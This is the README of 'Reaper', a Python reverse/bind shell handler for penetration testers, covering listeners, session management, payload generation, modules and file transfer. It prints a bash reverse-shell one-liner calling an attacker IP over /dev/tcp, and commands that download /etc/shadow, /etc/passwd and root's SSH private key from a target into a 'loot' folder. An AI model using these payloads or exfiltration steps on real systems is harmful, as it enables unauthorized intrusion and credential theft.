# Reaper

![Python](https://img.shields.io/badge/python-3.9+-blueviolet?style=for-the-badge&logo=python&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)

**Reaper** is a multi-session reverse/bind shell handler built for pentesters.

---

## Features

| Feature | Details |
|---|---|
| **Multi-session** | Handle unlimited shells simultaneously. List, switch, and background sessions. |
| **Multi-listener** | Bind to multiple ports at once (`-p 4444,5555,9001`). |
| **Live port management** | Add or remove ports while running,  no restart needed. |
| **Auto PTY upgrade** | Shell is upgraded to full PTY automatically,no manual upgrade needed. |
| **Windows support** | Upgrades PowerShell/CMD via ConPtyShell automatically. |
| **Session logging** | Every session logged automatically to `~/.reaper/logs/`. |
| **File upload** | Push local files to the target over TCP. |
| **File download** | Pull files or entire directories from the target. |
| **HTTP file server** | `reaper -s ./tools` or `serve .` from the prompt. |
| **Bind shell** | `reaper -c <target>` to connect outward to a bind shell. |
| **Payload generation** | Built-in payloads for bash, python, php, perl, ruby, nc, socat, powershell and more. |
| **Module system** | Extensible modules with hot-reload (`reload`). |
| **Tab completion** | Context-aware completes commands, session IDs, module names, interfaces, ports. |
| **Screenable mode** | Hidden command that redacts IPs for sharing screenshots. |
| **Clean signals** | `Ctrl+Z` backgrounds a session. `Ctrl+C` forwards SIGINT to the remote. |

---

## Installation

```bash
git clone https://github.com/z3r0s6/Reaper
cd Reaper
pipx install --editable .
```

---

## Usage

### Start a listener

```bash
# Default: 0.0.0.0:4444
reaper

# Custom port
reaper -p 9001

# Multiple ports at startup
reaper -p 4444,5555,9001

# Bind to a specific interface
reaper -i tun0 -p 4444
```

### Connect to a bind shell

```bash
reaper -c 10.10.10.50 -p 4444
```

### Serve files over HTTP

```bash
# Serve current directory on :8000
reaper -s .

# Serve a specific file on a custom port
reaper -s /opt/tools/linpeas.sh --serve-port 9090
```

### Show payloads for an interface

```bash
reaper -a tun0
reaper -a eth0
```

### Disable session logging

```bash
reaper -L
reaper --log-dir /tmp/reaper-logs
```

### Quick test (local)

Open two terminals:

```bash
# Terminal 1  start Reaper
reaper

# Terminal 2  connect a test shell
nc 127.0.0.1 4444
```

A session will appear in Terminal 1. Type `go 1` to interact with it.

---

## How it works

When a shell connects Reaper automatically:
1. Upgrades the shell to a full PTY
2. Notifies you it's ready

```
  [☠]  10.10.14.5:44321 connected  →  #1
  [✓]  Shell #1 auto-upgraded to PTY.
```

Just type `go 1` and you're in.

---

## Shell Commands

### Session management

| Command | Description |
|---|---|
| `ls` | List all sessions |
| `go <id>` | Interact with a session |
| `upgrade <id>` | Manually upgrade shell to PTY |
| `kill <id>` | Terminate a session |
| `log <id>` | Show log file path for a session |

### Port management

| Command | Description |
|---|---|
| `listeners` | List all active listeners |
| `addport <port>` | Start listening on a new port (no restart needed) |
| `rmport <port>` | Stop listening on a port |

```
reaper❯ addport 9001
  [✓]  Now listening on port 9001.

reaper❯ rmport 9001
  [✓]  Stopped listening on port 9001.
```

> `rmport` will refuse to remove the last remaining listener.

### Payload generation

Requires an interface name:

```
reaper❯ payloads tun0
reaper❯ payloads eth0
```

Each payload is displayed with its name and command on separate lines for easy copying:

```
════════════════════════════════════════════
  ☠  tun0  →  10.10.14.5:4444
────────────────────────────────────────────

  [01] bash
      bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"

  [02] python3
      python3 -c 'import os,pty,socket;...'
```

### Modules

```
reaper❯ modules
reaper❯ run sysinfo 1
reaper❯ run upload 1 /local/file.sh /tmp/file.sh
reaper❯ run download 1 /etc/passwd
reaper❯ run download_dir 1 /etc
reaper❯ run linpeas 1
reaper❯ run linpeas 1 -o /tmp/output.txt
reaper❯ reload
```

### HTTP server (from main menu)

```
reaper❯ serve /opt/tools 8888
reaper❯ serve .
reaper❯ stopserve
```

### Misc

```
reaper❯ listeners
reaper❯ help
reaper❯ exit
```

---

## Key Bindings (inside a session)

| Key | Action |
|---|---|
| `Ctrl+Z` | Background session, return to main menu |
| `Ctrl+C` | Send SIGINT to the remote process |

---

## Tab Completion

The prompt is fully context-aware:

| What you type | Tab completes |
|---|---|
| `go ` | active session IDs |
| `upgrade ` | active session IDs |
| `kill ` | active session IDs |
| `log ` | active session IDs |
| `run ` | module names |
| `run <mod> ` | active session IDs |
| `payloads ` | network interfaces |
| `rmport ` | active listening ports |
| *(first word)* | all commands |

---

## Writing Custom Modules

See [MODULES.md](MODULES.md) for the full guide.

Quick example:

```python
from reaper.modules.blueprint import ReaperModule

class MyModule(ReaperModule):
    name        = "my_module"
    description = "Does something cool."
    category    = "Enumeration"
    platform    = ["linux"]

    def run(self) -> None:
        result = self.exec("whoami")
        self.ok(f"Running as: {result.stdout.strip()}")
```

Drop the file in `src/reaper/modules/` and hot-reload:

```
reaper❯ reload
```

---

## File Transfer

### Upload (local → remote)

```
reaper❯ run upload 1 /home/kali/tools/linpeas.sh /tmp/linpeas.sh
```

### Download (remote → local)

```
reaper❯ run download 1 /etc/shadow
reaper❯ run download 1 /root/.ssh/id_rsa ./loot/id_rsa
```

### Download entire directory

```
reaper❯ run download_dir 1 /etc ./loot/etc.tar.gz
```

---

## Session Logs

Logs are written automatically to `~/.reaper/logs/`:

```
session_<id>_<ip>_<timestamp>.log
```

Find the log path for a session:

```
reaper❯ log 1
  [·]  Session #1 log: /home/kali/.reaper/logs/session_1_10.10.14.5_20260101_120000.log
```

---

## Screenable Mode

Redacts all IP addresses for sharing screenshots or recordings.

```
reaper❯ _reaper_screenable_
  [·]  Screenable mode ON
```

Hidden from help and tab completion.

---

## Project Structure

```
Reaper/
├── README.md
├── MODULES.md
├── pyproject.toml
└── src/
    └── reaper/
        ├── main.py          # CLI entry point & argument parsing
        ├── listener.py      # Core listener, session management, command loop
        ├── session.py       # Session model, logging, RawTerminal
        ├── detect.py        # OS auto-detection
        ├── cli.py           # Help text
        ├── server.py        # HTTP file server
        ├── models.py        # CommandResult, StreamLine
        ├── modules/
        │   ├── blueprint.py # ReaperModule base class
        │   ├── loader.py    # Dynamic module loader (hot-reload)
        │   ├── sysinfo.py   # System enumeration
        │   ├── upload.py    # File upload (local → remote)
        │   ├── download.py  # File download + directory archive
        │   └── linpeas.py   # LinPEAS in-memory runner
        └── utils/
            ├── ui.py        # Colors, ASCII art, notifications, spinner, boxes
            ├── tcp.py       # TCP one-shot send/recv servers
            └── payloads.py  # Reverse-shell payload generator
```
